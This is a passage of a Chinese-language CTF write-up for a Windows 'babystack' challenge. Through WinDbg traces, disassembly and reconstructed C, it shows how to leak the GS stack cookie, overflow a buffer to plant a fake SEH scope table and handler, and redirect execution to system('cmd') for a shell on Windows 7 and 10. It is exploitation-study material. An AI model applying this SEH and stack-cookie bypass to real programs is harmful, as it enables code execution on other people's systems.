    babystack+0x149b:
    00e2149b f2e981020000    repne jmp babystack+0x1722 (00e21722)
在 ValidateLocalCookies 中令 `24f748` 的位置的值和 `0x24f764` 做了异或运算，随后和 security
cookie 做比较，相等则会继续执行后面的内容，这里不相等，那后续 SEH 异常处理不会进行，跳转进入
SetUnhandledExceptionFilter，进入系统默认的异常处理。调用关系是
`sub_401722->sub_4016FA->SetUnhandledExceptionFilter` 。我们来看一下这个值是什么。
    .text:004010B3                 push    0FFFFFFFEh//TryLevel入栈
    .text:004010B5                 push    offset stru_403688//stru（scope table）入栈
    .text:004010BA                 push    offset sub_401460//seh handler入栈
    .text:004010BF                 mov     eax, large fs:0
    .text:004010C5                 push    eax//next pointer to seh chain 入栈
    .text:004010C6                 add     esp, 0FFFFFF40h
    .text:004010CC                 mov     eax, ___security_cookie
    .text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax
    .text:004010D4                 xor     eax, ebp//security cookie和ebp做异或运算，形成一个cookie
    .text:004010D6                 mov     [ebp+var_1C], eax//存放入栈中，这个值会在ValidateLocalCookies用来check 栈cookie
    0:000> p
    eax=b33cb7a2 ebx=7ffd8000 ecx=002ff700 edx=00000000 esi=5bf16314 edi=004d7b60
    eip=00c410d6 esp=002ff6a0 ebp=002ff770 iopl=0         nv up ei ng nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
    babystack+0x10d6:
    00c410d6 8945e4          mov     dword ptr [ebp-1Ch],eax ss:0023:002ff754=00c41580
    0:000> !exchain
    002ff760: babystack+1460 (00c41460)
    002ff7a8: babystack+1460 (00c41460)
    002ff7f4: ntdll!_except_handler4+0 (7708e195)
      CRT scope  0, filter: ntdll!__RtlUserThreadStart+2e (770e790b)
                    func:   ntdll!__RtlUserThreadStart+63 (770e7c80)
    Invalid exception stack at ffffffff
    0:000> dd 002ff750 l4
    002ff750  002ff774 b33cb7a2 002ff690 5be7a4e3//eax=0xb33cb7a2
接下来我一边调试，一边将 `VCRUNTIME140!ValidateLocalCookies` 的伪代码还原成C，其实这个函数主要就是对这个存放栈
Cookie 的位置做检查，其中 stru 结构体就是 scope table，对应的结构体变量请参照文章前面的 stru 的结构。
    int __cdecl ValidateLocalCookies(void (__thiscall *a1)(int), int a2, int a3)//sub_1000B2A0
    {
      int v3; // esi@2
      int v4; // esi@3
      if ( *(_DWORD *)stru->GSCookieOffset != -2 )
      {
        v3 = *(_DWORD *)(FramePointer + stru->GSCookieOffset) ^ (FramePointer + stru->GSCookieXOROffset);//这里frame pointer的值就是在原Function中栈ebp的值
        //00c410b1 8bec            mov     ebp,esp  esp=002ff770
        __guard_check_icall_fptr(a1);
        babystack!sub_401490(v3);//v3 = security_cookie sub_401490就是check security cookie和GSCookie的值是否相等
                /*.text:00401490 sub_401490      proc near               ; CODE XREF: sub_401060+46p
                        .text:00401490                                         ; .text:004013C4p
                        .text:00401490                                         ; DATA XREF: ...
                        .text:00401490                 cmp     ecx, ___security_cookie
                        .text:00401496                 repne jnz short loc_40149B
                        .text:00401499                 repne retn
                        .text:0040149B loc_40149B:                             ; CODE XREF: sub_401490+6j
                        .text:0040149B                 repne jmp sub_401722
                        .text:0040149B sub_401490      endp*/
      }
      v4 = *(_DWORD *)(FramePointer + stru->EHCookieOffset) ^ (FramePointer + stru->EHCookieXOROffset);
      __guard_check_icall_fptr(a1);
      return ((int (__thiscall *)(int))babystack!sub_401490)(v4);
    }
可以看到，这个位置存放的是 GSCookie 和 ebp 的一个异或结果，实际上这个值在这里就是为了防止栈溢出绕过 GSCookie 的检查，而这个位置在
prev 域 -0xC 的位置，因此这个值需要泄露出来，接下来我们对 exp 做修改，主要是将 stack
上刚才分析的这个Cookie值泄露出后在栈溢出时对栈做fix，之后继续调试。
    ////////////通过VCRUNTIME140!ValidateLocalCookies
    0:000> t
    eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
    eip=003a1490 esp=001df768 ebp=001df778 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    babystack+0x1490:
    003a1490 3b0d04403a00    cmp     ecx,dword ptr [babystack+0x4004 (003a4004)] ds:0023:003a4004=70244f1d
    0:000> p
    eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
    eip=003a1496 esp=001df768 ebp=001df778 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x1496:
    003a1496 f27502          repne jne babystack+0x149b (003a149b)           [br=0]
    0:000> p
    eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
    eip=003a1499 esp=001df768 ebp=001df778 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x1499:
    003a1499 f2c3            repne ret
    0:000> p
    eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
    eip=6c38b2c9 esp=001df76c ebp=001df778 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!ValidateLocalCookies+0x29:
    6c38b2c9 8b4708          mov     eax,dword ptr [edi+8] ds:0023:001dfd5c=ffffff20
    ///////////跳转到Handler Function执行system('cmd')
    0:000> t
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
    eip=003a138d esp=001df788 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x138d:
    003a138d 6868323a00      push    offset babystack+0x3268 (003a3268)
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
    eip=003a1392 esp=001df784 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x1392:
    003a1392 ff1584303a00    call    dword ptr [babystack+0x3084 (003a3084)] ds:0023:003a3084={ucrtbase!system (5bef89a0)}
在 Windows 7 下面完成攻击，获得 shell 交互。
因此，我们最后的利用过程是这样的，先构造如下的栈溢出的databuf结构。
（后面的利用过程中的源代码部分在文章中已经提到，这里就不再提了）然后输入任意非yes非no（严格匹配）的字符串，就可以输入我们的 databuf 了，这里
`sub_401000` 会由于字符串拷贝导致栈溢出，随后栈内被我们构造的 databuf
覆盖，随后我们输入yes，在else语句中，通过输入0，或者字符来触发异常。
    0:001> g//输入0，触发异常
    (1b03c4.1b03c0): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000000 ebx=7ffdf000 ecx=70244f1d edx=00000009 esi=5bf16314 edi=004c3ec0
    eip=003a1272 esp=001dfd00 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    *** ERROR: Module load completed but symbols could not be loaded for C:\Users\sh1\Desktop\babystack.exe
    babystack+0x1272:
    003a1272 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000000=????????
进入 SEH 后，利用 fake Scope Table 中的 fake handler function 在
`VCRUNTIME140!_except_handler4_common->VCRUNTIME140!_EH4_TransferToHandler`
中实现跳转控制eip。
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110138d edi=00000000
    eip=651faf5c esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_EH4_TransferToHandler+0x17:
    651faf5c ffe6            jmp     esi {babystack+0x134e (0110138d)}
    0:000> t
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
    eip=003a138d esp=001df788 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x138d:
    003a138d 6868323a00      push    offset babystack+0x3268 (003a3268)
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
    eip=003a1392 esp=001df784 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x1392:
    003a1392 ff1584303a00    call    dword ptr [babystack+0x3084 (003a3084)] ds:0023:003a3084={ucrtbase!system (5bef89a0)}
最后我们可以获得 shell，在 win10 下测试也通过了。
babyshellcode & babystack download url: 
* * *